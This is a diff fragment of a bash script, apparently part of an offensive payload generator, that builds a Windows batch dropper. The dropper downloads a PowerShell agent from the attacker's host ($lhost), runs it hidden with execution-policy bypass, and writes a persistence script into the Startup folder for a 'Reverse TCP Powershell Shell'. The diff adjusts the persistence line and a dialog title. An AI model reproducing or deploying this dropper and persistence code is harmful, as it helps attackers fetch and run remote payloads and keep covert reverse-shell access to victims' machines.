@@ -12375,7 +12375,7 @@ else
    echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
-   echo "echo @echo off&&PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" ^> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Persiste.bat\"" >> $IPATH/output/$Drop.$ext.bat
+   echo "echo PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Persiste.bat\"" >> $IPATH/output/$Drop.$ext.bat
 fi
 
 
@@ -12463,7 +12463,7 @@ rm $ApAcHe/Download.html > /dev/nul 2>&1
 
 ## Remark related to 'persistence' function..
 if [ "$persistence" = "Add persistence)" ]; then
-   zenity --title="☠ Reverse Powershell Shell (hex obfuscation) ☠" --text "REMARK:\nTo delete 'persistence' we need to manualy delete the follow two scripts\n\n1 - $rpath\\$NaM.ps1 (agent.ps1)\n2 - %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Persiste.bat (persistence script)" --info > /dev/null 2>&1
+   zenity --title="☠ Reverse TCP Powershell Shell (hex obfuscation) ☠" --text "REMARK:To delete 'persistence' we need to manualy delete the follow two scripts\n\n1 - $rpath\\$NaM.ps1 (agent.ps1)\n2 - %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Persiste.bat (persistence script)" --info > /dev/null 2>&1
 fi
 sh_menu
 }
